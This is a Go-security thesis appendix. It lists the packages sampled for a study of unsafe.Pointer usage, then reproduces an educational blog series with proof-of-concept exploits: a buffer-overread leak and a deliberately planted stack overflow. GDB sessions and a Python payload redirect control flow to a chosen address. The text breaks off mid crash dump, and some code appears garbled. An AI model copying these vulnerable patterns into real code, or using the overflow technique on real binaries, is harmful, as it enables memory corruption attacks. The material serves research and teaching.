%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% D-small-study-sampled-packages

%% -----------------------------------------------------------------------------

\chapter{Packages containing the samples for the small-scale study}\label{ch:survey-small-appendix-packages}

For the small-scale, in-depth study described in Chapter~\ref{ch:survey-small-scale}, I sampled 1000 snippets from
application code packages, and 400 snippets from the standard library and the sys package.
The samples are taken from unsafe usages by ten selected projects as shown in Table~\ref{tbl:survey-small-projects},
but they are made up by quite some more packages, some of which are third-party packages.

These tables show which packages make up the samples.


%% created by Pandas in notebook table-formatting.ipynb
\begin{longtable}{lr}
    \caption{\centering Packages making up the 1000 application code samples}
    \label{tbl:survey-small-packages-app}\\
    \toprule
    Package &  Sample count \\
    \midrule
    \endfirsthead
    \multicolumn{2}{c}%
    {\tablename\ \thetable\ -- \textit{Continued from previous page}} \\
    \toprule
    Package &  Sample count \\
    \midrule
    \endhead
    \multicolumn{2}{c}{\textit{Continued on next page}} \\
    \endfoot
    \bottomrule
    \endlastfoot

    \bottomrule
    \endlastfoot
    k8s.io/kubernetes/pkg/apis/core/v1 &      266 \\
    github.com/json-iterator/go &      109 \\
    github.com/vishvananda/netlink/nl &       58 \\
    github.com/ugorji/go/codec &       56 \\
    github.com/elastic/go-structform/gotype &       45 \\
    k8s.io/apiextensions-apiserver/pkg/apis/apiext... &       40 \\
    github.com/modern-go/reflect2 &       32 \\
    k8s.io/apiextensions-apiserver/pkg/apis/apiext... &       28 \\
    k8s.io/apiserver/pkg/apis/audit/v1beta1 &       26 \\
    github.com/hashicorp/go-msgpack/codec &       23 \\
    gorgonia.org/tensor/native &       21 \\
    k8s.io/apiserver/pkg/apis/audit/v1 &       20 \\
    gorgonia.org/tensor &       13 \\
    go.etcd.io/bbolt &       13 \\
    github.com/gogo/protobuf/proto &       12 \\
    k8s.io/apiserver/pkg/apis/audit/v1alpha1 &       12 \\
    k8s.io/client-go/tools/clientcmd/api/v1 &       12 \\
    github.com/coreos/bbolt &       12 \\
    golang.org/x/net/internal/socket &       12 \\
    gorgonia.org/tensor/internal/execution &       11 \\
    github.com/cilium/ebpf &       10 \\
    golang.org/x/net/ipv6 &       10 \\
    golang.org/x/net/ipv4 &        9 \\
    k8s.io/apiserver/pkg/apis/apiserver/v1alpha1 &        8 \\
    gorgonia.org/tensor/internal/storage &        8 \\
    github.com/vishvananda/netlink &        7 \\
    k8s.io/apiserver/pkg/apis/config/v1 &        7 \\
    github.com/golang/protobuf/proto &        6 \\
    k8s.io/client-go/pkg/apis/clientauthentication... &        5 \\
    k8s.io/apiserver/pkg/apis/apiserver/v1beta1 &        5 \\
    google.golang.org/protobuf/reflect/protoreflect &        5 \\
    github.com/Azure/azure-storage-blob-go/azblob &        4 \\
    k8s.io/apimachinery/pkg/apis/meta/v1 &        4 \\
    k8s.io/client-go/pkg/apis/clientauthentication... &        4 \\
    github.com/ishidawataru/sctp &        3 \\
    github.com/elastic/go-perf &        3 \\
    k8s.io/metrics/pkg/apis/metrics/v1alpha1 &        3 \\
    k8s.io/metrics/pkg/apis/metrics/v1beta1 &        3 \\
    google.golang.org/protobuf/internal/impl &        3 \\
    github.com/aliyun/alibaba-cloud-sdk-go/sdk/res... &        3 \\
    github.com/elastic/go-structform/internal/unsafe &        3 \\
    golang.org/x/tools/internal/event/label &        3 \\
    k8s.io/apiserver/pkg/apis/apiserver/v1 &        2 \\
    golang.org/x/tools/internal/fastwalk &        2 \\
    github.com/docker/docker/pkg/term &        2 \\
    github.com/francoispqt/gojay &        2 \\
    github.com/fsnotify/fsnotify &        2 \\
    github.com/opencontainers/runc/libcontainer/sy... &        2 \\
    github.com/yuin/gopher-lua &        2 \\
    k8s.io/sample-apiserver/pkg/apis/wardle/v1alpha1 &        2 \\
    github.com/google/go-cmp/cmp/internal/value &        2 \\
    k8s.io/metrics/pkg/apis/custom\_metrics/v1beta2 &        2 \\
    github.com/cilium/ebpf/perf &        2 \\
    k8s.io/apiserver/pkg/authentication/token/cache &        2 \\
    github.com/gorilla/websocket &        2 \\
    k8s.io/kube-aggregator/pkg/apis/apiregistratio... &        1 \\
    k8s.io/metrics/pkg/apis/external\_metrics/v1beta1 &        1 \\
    k8s.io/kube-aggregator/pkg/apis/apiregistratio... &        1 \\
    k8s.io/apimachinery/pkg/apis/meta/internalversion &        1 \\
    k8s.io/apimachinery/pkg/apis/meta/v1beta1 &        1 \\
    k8s.io/apimachinery/pkg/runtime/serializer/json &        1 \\
    code.cloudfoundry.org/go-diodes &        1 \\
    github.com/weaveworks/tcptracer-bpf/pkg/tracer &        1 \\
    gopkg.in/jcmturner/gokrb5.v7/credentials &        1 \\
    github.com/mailru/easyjson/jlexer &        1 \\
    github.com/cespare/xxhash &        1 \\
    github.com/cespare/xxhash/v2 &        1 \\
    github.com/chewxy/math32 &        1 \\
    github.com/chzyer/readline &        1 \\
    github.com/containerd/console &        1 \\
    github.com/coocood/freecache &        1 \\
    github.com/coreos/etcd/client &        1 \\
    github.com/coreos/go-systemd/journal &        1 \\
    github.com/coreos/go-systemd/sdjournal &        1 \\
    github.com/google/gopacket/pcap &        1 \\
    github.com/jessevdk/go-flags &        1 \\
    github.com/k-sone/critbitgo &        1 \\
    github.com/nats-io/nats/encoders/builtin &        1 \\
    gopkg.in/fsnotify.v1 &        1 \\
    github.com/philhofer/fwd &        1 \\
    github.com/prometheus/prometheus/scrape &        1 \\
    github.com/spaolacci/murmur3 &        1 \\
    github.com/syndtr/gocapability/capability &        1 \\
    github.com/thanos-io/thanos/pkg/block/indexheader &        1 \\
    github.com/urso/diag/ctxfmt &        1 \\
    github.com/urso/go-bin &        1 \\
    github.com/weaveworks/ps &        1 \\
    go.elastic.co/apm &        1 \\
    golang.org/x/crypto/internal/subtle &        1 \\
    gonum.org/v1/gonum/graph/internal/set &        1 \\
    google.golang.org/protobuf/internal/strs &        1 \\
    sigs.k8s.io/structured-merge-diff/v3/fieldpath &        1 \\
\end{longtable}

%% created by Pandas in notebook table-formatting.ipynb
\begin{longtable}{lr}
    \caption{\centering Packages making up the 400 standard library samples}
    \label{tbl:survey-small-packages-std}\\
    \toprule
    Package &  Sample count \\
    \midrule
    \endfirsthead
    \multicolumn{2}{c}%
    {\tablename\ \thetable\ -- \textit{Continued from previous page}} \\
    \toprule
    Package &  Sample count \\
    \midrule
    \endhead
    \multicolumn{2}{c}{\textit{Continued on next page}} \\
    \endfoot
    \bottomrule
    \endlastfoot

    \bottomrule
    \endlastfoot
    golang.org/x/sys/unix &      225 \\
    runtime &       96 \\
    syscall &       32 \\
    reflect &       27 \\
    internal/reflectlite &        8 \\
    sync &        3 \\
    internal/poll &        2 \\
    runtime/internal/atomic &        2 \\
    crypto/internal/subtle &        1 \\
    go/types &        1 \\
    internal/race &        1 \\
    runtime/pprof &        1 \\
    strings &        1 \\
\end{longtable}


%% former chapter 3

%% -----------------------------------------------------------------------------

\section{Submission of fixes to open-source libraries}\label{sec:vulnerability-fixes}


%% -----------------------------------------------------------------------------

\chapter{Blog Post Series}\label{ch:blog}


%% -----------------------------------------------------------------------------

\section{Part 1}

Go in general is a safe language. It has memory builtin safety measures that should avoid common buffer overflow
vulnerabilities, like they often exist in C programs.

The unsafe standard library package defeats this memory safety. With unsafe.Pointer, we can create a pointer of
arbitrary type. The compiler can't and won't enforce safety measures on this type of pointer.

In this first of a four-part, weekly series on practically exploiting unsafe.Pointer usage, we will cover the possibilities
that come with unsafe.Pointer and look at a first potential vulnerability: an information leakage.


\textbf{What is this about?}

So why did I write this blog post? I am a computer science student at TU Darmstadt, Germany. I am currently writing my
Master's thesis on an analysis of real-world usage patterns of the Go unsafe package. As part of the research, I look
into actual use cases of unsafe.Pointer references in the biggest open source Go projects, analyze and categorize them,
and identify potentially dangerous patterns and vulnerabilities. I am also comparing the unsafe features of Go to the
unsafe mode in Rust [[4]](references), as there are some similarities.

As a first step in finding out which usage patterns are dangerous, I created some artificial proof of concepts that
demonstrate applications that are vulnerable due to a wrong use of unsafe.Pointer. While doing this, I figured this
could be an interesting read or even short exercise for Go developers. If you have some ideas or thoughts on this topic,
I'd be very happy to know!

So grab your favorite beverage, fire up your code editor of choice, and enjoy this little journey covering different
types of vulnerabilities. We will look at the exact problem in the code and explain why it arises, and discuss possible
means of introducing such a problem in the real world.


\textbf{Buffer overflows, part 1: the stack layout }

Let's start with a short discussion of the stack. A stack is a data structure that grows like a tower of things. New
items can be pushed onto the stack, and items on the stack can be removed or popped. A CPU uses a stack to keep track
of data that is meaningful in the current context. Most importantly, it is used for calling functions. The stack used
in the x8664 architecture is an area in the RAM which is identified by the stack pointer register rsp.

Pushing something onto the stack is done be decrementing the stack pointer by some amount, e.g. a processor word (8 byte
on 64-bit architecture). Then the data is written to the address where the stack pointer now points to. Decrementing the
stack pointer marks the memory region as belonging to the stack. When popping values from the stack, the stack pointer
is incremented again, marking the memory region as free again. Because the stack pointer decrements with new data, we
can say that the stack grows to the bottom, starting from high addresses in memory and growing to low addresses.


When the current program calls a function, the return address as well as some function parameters (more on this in part
3 of this series) are pushed onto the stack, and the processor jumps to the first instruction of the function. This jump is done
by setting the instruction pointer register rip. Then, when the function returns (by executing the ret instruction),
the return address is popped from the stack and put into the rip register. More on this can be read in [[2]](references).

The function can store local variables on the stack (inside its so-called stack frame). These are pushed onto the stack
after the return address and saved registers, meaning the variables are at lower memory addresses than the return
address. Furthermore, variables on the stack are located directly next to each other. This is why bounds checking is
very important for buffers. Reading or writing outside the bounds of a variable means we are reading or writing other
variables. We call this buffer overflow.

This is a visualization of a stack frame for a function:


\textbf{Go memory safety}

Go employs some safety techniques that prevent buffer overflows, among other vulnerabilities. The type system strictly
encodes the buffer length of variables, e.g. we have [8]byte and [16]byte as completely different types with no
casting from the short buffer to the long buffer. This prevents the misuse of memory regions which will eventually lead
to a potentially exploitable buffer overflow.

Dangerous operations common to C programs such as pointer casting and the infamous, no-bounds-checking gets() function
are therefore impossible with safe Go programs.

However, there exists the unsafe package and with it the unsafe.Pointer type [[1]](references). This pointer type
is special in that it can participate in type operations that would otherwise be forbidden:

1. we can cast any pointer type into unsafe.Pointer
2. we can cast unsafe.Pointer into any pointer type
3. we can cast unsafe.Pointer into uintptr, which is essentially the address as an integer
4. we can cast uintptr into unsafe.Pointer

Points 1 and 2 allow type-casting between arbitrary types, and points 3 and 4 allow pointer arithmetic. With these
powers however comes great responsibility: using them removes the safety net of Go, meaning we're back at the security
madness of plain C code. The unsafe package must therefore be used only with extreme caution.

In the following proof of concepts, we will demonstrate some of the potential vulnerabilities that can be introduced
surprisingly fast when using unsafe.Pointer.


\textbf{Information leakage POC}

In this short proof of concept, let's assume there is a buffer of harmless, public data. It is called harmlessData
and it might store e.g. the version of the program, or the public display name of a logged-in user.

Behind it, there is a declaration of a secret data buffer. For the sake of the argument, imagine that it might be some
private information about a logged-in user, e.g. their password hash or a certificate private key.

func main()
// this could be some public information, e.g. version information
harmlessData := [8]byte'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A'
// however, this could be critical private information such as a private key
secret := [17]byte'l', '3', '3', 't', '-', 'h', '4', 'x', 'x', '0', 'r', '-', 'w', '1', 'n', 's', '!'
// ...


Next, the buffer is cast. Using the unsafe.Pointer type, we can do any type casting we want, defeating the Go memory
safety measures. Here, we cast the buffer into a new byte buffer, but with a bigger size. After this, we print the new
(dangerous) buffer.

// ...
// (accidentally) cast harmless buffer into a new buffer type of wrong size
var dangerousData = (*[8+17]byte)(unsafe.Pointer(harmlessData[0]))
// print (misused) buffer
fmt.Println(string((*dangerousData)[:]))


Running this script will read the newly created, dangerous buffer. The length information will be inappropriate, and
thus the program will read memory after the end of the harmless data, revealing the secret data:

go run main.go
AAAAAAAAl33t-h4xx0r-w1ns!

This is an information leak, because we read and send more data than we wanted.

But how could this ever happen? Let's assess a threat model!


\textbf{Threat model}

Admittedly, when the buffer definition and cast are located very close to each other, it is hard to imagine that such
a bug would go unnoticed in a production software project. But I would argue that it is far less unlikely for such
mistakes to happen if we add some human factors into the equation.

Imagine you work at a large software company which is building some application that has a client/server communication
model. The development of the server and client applications has been separated into different teams, and you work in
the server team. Now, at some meeting a couple of months ago, you and your colleagues drafted and agreed upon an API
specification for the binary communications protocol that you want to use between the client and server. The protocol
features a request definition that the client sends to the server. The request data is serialized into a binary stream.
Its structure looks like this:

![Binary protocol structure](assets/protocol.svg)

It is a super simple protocol that doesn't even feature variable-length messages. It is just a static byte object with
a version, message type, and the actual data. Similar to the request, there is also a response type that looks the same.
Now, you and your team printed the diagram weeks ago and put it on your wall to ensure all developers can see it promptly.
But what none of you realized is that the client development team agreed on a new version of the protocol, which has a
256 bytes data field to reduce the over-the-wire packet size.

When you implement the server, you are now adding a simple buffer to store request and response objects for later
processing. You look at the diagram on the wall and determine that the size of protocol messages is guaranteed to be
exactly 516 byte, so initialize a [516]byte variable. To avoid unnecessary copying of the data structure before
reaching your buffering function, your team has decided to pass along a reference to the request object. You are using
an unsafe.Pointer reference to simplify casting operations. The function you are implementing looks like this:

go
func bufferrequest(req unsafe.Pointer)
var buf [516]byte
buf = *(*[516]byte)(req)
// use buf for some operations



Now, the problem is that the req parameter, referencing the source data structure somewhere in memory, was created
with the new protocol version in mind, i.e. the request packet only takes 260 bytes. But your new buffer is reading
516 bytes, that is 256 bytes too many! When the buffer is sent somewhere else, or shown to the user, you might read
and publish 256 extra bytes, containing potentially secret information.

A similar thing could happen in the other direction, when the response object is used.

When you push this new function, and your team does a thorough code review, all your colleagues see the buffer allocation,
immediately look at the wall and verify that the request data packet indeed takes exactly 516 bytes. None of them catches
the mistake and the software is shipped.

The problem was not a miscalculation, but a miscommunication within the organization, combined with a lack of defensive
programming techniques and a missing mindset of the dangers that come with the use of unsafe.Pointer references.

By the way, reading and sending more data than the correct amount might make you remember one of the most dangerous bugs
of recent times: the famous Heartbleed bug in OpenSSL [[3]](references), where a missing bounds check cause a read
buffer overrun and leaked private information from the process memory. However, this example is different in that the
length is **not provided by an attacker**. The length information that OpenSSL failed to verify was supplied as part of
the input data to OpenSSL. Here, I crafted an example where the length mismatch is statically coded into the binary
because of a mistake the programmers made. A user-supplied length overrun is much more dangerous because it does not
cause problems in every run of the software, which makes it much harder to detect.

An example more similar to the Heartbleed bug would require a protocol definition with a length field, and a server
application crafting a buffer using that length information. This is possible when manually crafting slices in Go using
the reflect.SliceHeader structure, and we will explore that in the next part of this series!


\textbf{Proof of concept code}

I published the proof of concept code for this post, as well as the code for the following parts 2 to 4, in a Github
repository:

If you'd like to check out the complete code and run it for yourself, you can save yourself some typing by using this
repository.



%% -----------------------------------------------------------------------------

\section{Part 2}

In this second part, we will evolve from reading memory to redirecting the code flow. This means we will be controlling
what is being executed.

Buffer overflow, part 2: controlling the return address

In the first part we learned that local variables are located on the stack at addresses just below the return address.
When the function returns, it will increment the stack pointer to the point where no space for local variables is used,
effectively freeing them. The stack pointer rsp will then point to the stored return address.

Now comes the ret machine instruction. It is actually equivalent to pop rip or even mov rip, [rsp]; add rsp, 8.
The processor will fetch the address stored on the top of the stack, put it into the instruction pointer register, and
continue execution at that address.

![Return to saved RIP](assets/return.svg)

If we can somehow change the return address stored on the stack to an address we can control, we can change the program
control flow.


Code flow redirection POC

To see how we can actually exploit this, we will have a look at a proof of concept exploit with an example program.

First, we create a win function to be compiled into the binary. We can use it as a target to redirect the code
flow to. This is a good first step in learning code flow exploitation. The function does not do very much, it simply prints
"win!" so that we know we did good:

\begin{lstlisting}[language=Golang, label=lst:win-function, caption=Target function \texttt{win} for code flow redirection]
func win()
fmt.Println("win!")
\end{lstlisting}

The main function of the program looks like this:

\begin{lstlisting}[language=Golang, label=lst:redirection-poc-1, caption=Code flow redirection POC first part]
// initialize the reader outside of the main function to simplify POC development, as
// there are less local variables on the stack.
var reader = bufio.NewReader(os.Stdin)

func main()
// this is a harmless buffer, containing some harmless data
harmlessData := [8]byte'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A'

// create a slice of length 512 byte, but assign the address of the harmless data as
// its buffer. Use the reflect.SliceHeader to change the slice
confusedSlice := make([]byte, 512)
sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(confusedSlice))
harmlessDataAddress := uintptr(unsafe.Pointer((harmlessData[0])))
sliceHeader.Data = harmlessDataAddress

// now read into the confused slice from STDIN. This is not quite as bad as a gets()
// call in C, but almost. The function will read up to 512 byte, but the underlying
// buffer is only 8 bytes. This function is pretty much the complete vulnerability
,  = reader.Read(confusedSlice)
\end{lstlisting}


There is a buffer of length 8 bytes with some harmless data. It is created as a local variable, which means it will live
on the stack at an address a bit lower than the return address.

Next, we will simulate an almost-as-bad coding practice as calling the gets() function in a C code. We will
deliberately create a buffer overflow vulnerability. Recall that Go has some safety features that prevent buffer
overflows, so for this to work we are using the unsafe.Pointer type.

We initialize a slice with initial length and capacity 512 bytes. The slice is actually placed on the heap, not the
stack, but that is irrelevant for the vulnerability. Next, using the reflect.SliceHeader structure we can extract
the slice header data structure that Go uses internally to represent the slice. It looks like this:

For testing, I here refer to Listing~\ref{lst:win-function}.

go
type SliceHeader struct
Data uintptr
Len  int
Cap  int



The length and capacity are 512 in this case, and Data is a pointer to the underlying array that contains the elements
in the slice. Now, using the magic of unsafe pointers we can obtain the address of the 8 byte harmless buffer, cast it
into a uintptr address value and replace the Data pointer with that address. This way, the slice will now point to the
small buffer as its underlying array, but the length will still be set to 512 bytes.

This is a misuse of the unsafe package and it creates a very dangerous situation: Calling reader.Read() in the next
statement will fill the slice with data from standard input, but the function thinks it is safe to read up to 512 bytes
while the underlying array is only 8 bytes long. This is not completely identical to the unbounded gets() call,
but the effect is the same as the confused slice is more than long enough to provide an attack surface.

To sketch a threat model, recall the binary communication protocol from the last part of this blog series. We mentioned
that in order to have dynamic packet lengths, we would add a length field. If we write the code for the server application
without the dangers of explicitly creating slice headers in mind, we could simply use the length coming from the request
data as length for our slice. This would create a situation similar to the one above, and because the length would be
set by an attacker, a bit closer to the Heartbleed bug [[1]](references) as well.


Crafting a binary exploit

Now, how can we use this buffer overflow vulnerability and create an actual exploit that will put a meaningful address
into the stack at exactly the right position to be loaded into the instruction pointer? For this, we will use GDB.

Playing around with the program shows an input prompt that reads some data and then seems to just swallow it:

shell
./main
Hello World



However, putting in a large string will crash the program. That is a pretty good hint that there is potential to
exploit a buffer overflow.

shell
./main
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
unexpected fault address 0x0
fatal error: fault
[signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x4925d1]

goroutine 1 [running]:
runtime.throw(0x4c1077, 0x5)
/usr/lib/go/src/runtime/panic.go:1112 +0x72 fp=0xc000110f50 sp=0xc000110f20 pc=0x42ebd2
runtime.sigpanic()
/usr/lib/go/src/runtime/signalunix.go:694 +0x3cc fp=0xc000110f80 sp=0xc000110f50 pc=0x4429dc
runtime: unexpected return pc for main.main called from 0x4141414141414141
stack: frame=sp:0xc000110f80, fp:0xc000110f88 stack=[0xc000110000,0xc000111000)
    000000c000110e80:  0000000000000001  0000000000000000
    000000c000110e90:  000000c000110ed0  0000000000430404 <runtime.gwrite+164>
    000000c000110ea0:  0000000000000002  00000000004c0dd6
    000000c000110eb0:  0000000000000001  0000000000000001
    000000c000110ec0:  000000c000110f3d  0000000000000003
    000000c000110ed0:  000000c000110f20  0000000000430c28 <runtime.printstring+120>
    000000c000110ee0:  000000000042ed97 <runtime.fatalthrow+87>  000000c000110ef0
    000000c000110ef0:  0000000000458580 <runtime.fatalthrow.func1+0>  000000c000000180
    000000c000110f00:  000000000042ebd2 <runtime.throw+114>  000000c000110f20
    000000c000110f10:  000000c000110f40  000000000042ebd2 <runtime.throw+114>
    000000c000110f20:  000000c000110f28  0000000000458500 <runtime.throw.func1+0>
    000000c000110f30:  00000000004c1077  0000000000000005
    000000c000110f40:  000000c000110f70  00000000004429dc <runtime.sigpanic+972>
    000000c000110f50:  00000000004c1077  0000000000000005
    000000c000110f60:  4141414141414141  0000000000000000
    000000c000110f70:  4141414141414141  00000000004925d1 <main.main+177>
    000000c000110f80: <4141414141414141 >4141414141414141
    000000c000110f90:  4141414141414141  4141414141414141
    000000c000110fa0:  4141414141414141  4141414141414141
    000000c000110fb0:  4141414141414141  4141414141414141
    000000c000110fc0:  4141414141414141  4141414141414141
    000000c000110fd0:  4141414141414141  4141414141414141
    000000c000110fe0:  4141414141414141  4141414141414141
    000000c000110ff0:  4141414141414141  4141414141414141
    main.main()
    /tmp/code-injection/main.go:28 +0xb1 fp=0xc000110f88 sp=0xc000110f80 pc=0x4925d1


    In the resulting stack trace, we can even see a lot of 0x41 values, which is the ASCII value for the letter A.

    It is time to debug the program with GDB and see where the instruction pointer actually points to after the function
    return. This way, we can adjust the number of bytes that we need to scramble into the program before we can put our
    exploit payload, overwriting the return address on the stack.

    To do this, I create a Python script to produce the exploit payload:

    python
    !/usr/bin/env python2

    pattern = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV"
    print(pattern)


    The pattern consists of letters in ascending order. This is a pattern that is easily recognizable in the hex outputs
    of GDB and really useful to determine the return address offset on the stack.

    In GDB, start the program like this:

    gdb
    gdb-peda run <<<(./exploitwin.py)
    [...]
    Stopped reason: SIGSEGV
    0x00000000004925d1 in main.main () at main.go:28


    We pipe the output of the exploit script into the program, and we see that the program receives a SIGSEGV segmentation
    fault signal. This signal means that the processor tried to read or write data at an invalid address, here it's because
    it tried to execute the ret instruction and jump to an address consisting of our ASCII characters. To see
    which address the CPU would jump to, we need to look at the top of the stack:

    gdb
    gdb-peda x/8wx rsp
    0xc000068f80:	0x4f4f4f4f	0x50505050	0x51515151	0x52525252
    0xc000068f90:	0x53535353	0x54545454	0x55555555	0x56565656


    Using the x command, we inspect 8 words of data (each word is 4 bytes in GDB) and print them in hexadecimal form. The
    first two blocks (8 bytes total) are the 64-bit word that the CPU wants to put into the rip register. We
    can see that it is 0x4f4f4f4f50505050. Looking at the ASCII table, we see that it corresponds to OOOOPPPP, and
    therefore we need to cut the padding just before the O's and replace those eight characters with the address we want to
    jump to.

    Just before closing GDB, let's quickly use it to find the address of our specially crafted win function. First, try
    to directly access its address:

    shell
    gdb-peda x main.win
    No symbol "main.win" in current context.


    We see that there doesn't seem to be any function called win. This is because the Go compiler decided to inline the
    function (we can see the inlining decisions by compiling with go build -gcflags='-m'). Let's instead just directly
    jump to the address of the print call that will show us the win message. We search for it in the disassembly of the
    main function:

    gdb
    gdb-peda disassemble main.main
    Dump of assembler code for function main.main:
    0x0000000000492520 <+0>:	mov    rcx,QWORD PTR fs:0xfffffffffffffff8
    0x0000000000492529 <+9>:	cmp    rsp,QWORD PTR [rcx+0x10]
    0x000000000049252d <+13>:	jbe    0x49262d <main.main+269>
    0x0000000000492533 <+19>:	sub    rsp,0x78
    0x0000000000492537 <+23>:	mov    QWORD PTR [rsp+0x70],rbp
    0x000000000049253c <+28>:	lea    rbp,[rsp+0x70]
    0x0000000000492541 <+33>:	mov    rax,QWORD PTR [rip+0x48e10]         0x4db358
    0x0000000000492548 <+40>:	mov    QWORD PTR [rsp+0x40],rax
    0x000000000049254d <+45>:	lea    rax,[rip+0xe82c]         0x4a0d80
    0x0000000000492554 <+52>:	mov    QWORD PTR [rsp],rax
    0x0000000000492558 <+56>:	mov    QWORD PTR [rsp+0x8],0x200
    0x0000000000492561 <+65>:	mov    QWORD PTR [rsp+0x10],0x200
    0x000000000049256a <+74>:	call   0x443670 <runtime.makeslice>
    0x000000000049256f <+79>:	mov    rax,QWORD PTR [rsp+0x18]
    0x0000000000492574 <+84>:	mov    QWORD PTR [rsp+0x58],rax
    0x0000000000492579 <+89>:	mov    QWORD PTR [rsp+0x60],0x200
    0x0000000000492582 <+98>:	mov    QWORD PTR [rsp+0x68],0x200
    0x000000000049258b <+107>:	lea    rax,[rsp+0x40]
    0x0000000000492590 <+112>:	mov    QWORD PTR [rsp+0x58],rax
    0x0000000000492595 <+117>:	mov    rax,QWORD PTR [rip+0xd3ce4]         0x566280 <main.reader>
    0x000000000049259c <+124>:	mov    QWORD PTR [rsp],rax
    0x00000000004925a0 <+128>:	mov    rax,QWORD PTR [rsp+0x58]
    0x00000000004925a5 <+133>:	mov    QWORD PTR [rsp+0x8],rax
    0x00000000004925aa <+138>:	mov    QWORD PTR [rsp+0x10],0x200
    0x00000000004925b3 <+147>:	mov    QWORD PTR [rsp+0x18],0x200
    0x00000000004925bc <+156>:	call   0x46b740 <bufio.(*Reader).Read>
    0x00000000004925c1 <+161>:	cmp    BYTE PTR [rsp+0x40],0x2a
    0x00000000004925c6 <+166>:	je     0x4925d2 <main.main+178>
    0x00000000004925c8 <+168>:	mov    rbp,QWORD PTR [rsp+0x70]
    0x00000000004925cd <+173>:	add    rsp,0x78
    => 0x00000000004925d1 <+177>:	ret
    0x00000000004925d2 <+178>:	nop
    0x00000000004925d3 <+179>:	xorps  xmm0,xmm0
    0x00000000004925d6 <+182>:	movups XMMWORD PTR [rsp+0x48],xmm0
    0x00000000004925db <+187>:	lea    rax,[rip+0xe65e]         0x4a0c40
    0x00000000004925e2 <+194>:	mov    QWORD PTR [rsp+0x48],rax
    0x00000000004925e7 <+199>:	lea    rax,[rip+0x491b2]         0x4db7a0
    0x00000000004925ee <+206>:	mov    QWORD PTR [rsp+0x50],rax
    0x00000000004925f3 <+211>:	mov    rax,QWORD PTR [rip+0xd3c9e]         0x566298 <os.Stdout>
    0x00000000004925fa <+218>:	lea    rcx,[rip+0x4a95f]         0x4dcf60 <go.itab.*os.File,io.Writer>
    0x0000000000492601 <+225>:	mov    QWORD PTR [rsp],rcx
    0x0000000000492605 <+229>:	mov    QWORD PTR [rsp+0x8],rax
    0x000000000049260a <+234>:	lea    rax,[rsp+0x48]
    0x000000000049260f <+239>:	mov    QWORD PTR [rsp+0x10],rax
    0x0000000000492614 <+244>:	mov    QWORD PTR [rsp+0x18],0x1
    0x000000000049261d <+253>:	mov    QWORD PTR [rsp+0x20],0x1
    0x0000000000492626 <+262>:	call   0x48bf10 <fmt.Fprintln>
    0x000000000049262b <+267>:	jmp    0x4925c8 <main.main+168>
    0x000000000049262d <+269>:	call   0x459ae0 <runtime.morestacknoctxt>
    0x0000000000492632 <+274>:	jmp    0x492520 <main.main>
    End of assembler dump.


    It might not be completely obvious where the function starts, but given the call to win that we added to stop the
    compiler from removing the function altogether was inside an if-statement, it is reasonable that the function would
    be at the target of some conditional jump instruction (je in line <+161> here): it is at line <+178>, starting with
    a NOP instruction. Skipping the NOP, we can use line <+179> or address 0x00000000004925d3 as target.

    So let's update the exploit code to use the correct padding and the target address:

    python
    !/usr/bin/env python2

    import struct

    padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"
    winp = struct.pack("Q", 0x4925d3)

    print(padding + winp)


    Running the program with this input creates the following output:

    shell
    ./exploitwin.py | ./main
    win!
    unexpected fault address 0xc000072000
    fatal error: fault
    [signal SIGSEGV: segmentation violation code=0x2 addr=0xc000072000 pc=0xc000072000]

    goroutine 1 [running]:
    runtime.throw(0x4c1077, 0x5)
    /usr/lib/go/src/runtime/panic.go:1112 +0x72 fp=0xc000070fd8 sp=0xc000070fa8 pc=0x42ebd2
    runtime: unexpected return pc for runtime.sigpanic called from 0xc000072000
    stack: frame=sp:0xc000070fd8, fp:0xc000071008 stack=[0xc000070000,0xc000071000)
        000000c000070ed8:  000000c000070fbc  000000c000070f18
        000000c000070ee8:  000000000043023b <runtime.recordForPanic+299>  0000000000590565
        000000c000070ef8:  00000000004c0dd6  0000000000000001
        000000c000070f08:  0000000000000001  0000000000000000
        000000c000070f18:  000000c000070f58  0000000000430404 <runtime.gwrite+164>
        000000c000070f28:  0000000000000002  00000000004c0dd6
        000000c000070f38:  0000000000000001  0000000000000001
        000000c000070f48:  000000c000070fbc  000000000000000c
        000000c000070f58:  000000c000070fa8  0000000000430c28 <runtime.printstring+120>
        000000c000070f68:  000000000042ed97 <runtime.fatalthrow+87>  000000c000070f78
        000000c000070f78:  0000000000458580 <runtime.fatalthrow.func1+0>  000000c000000180
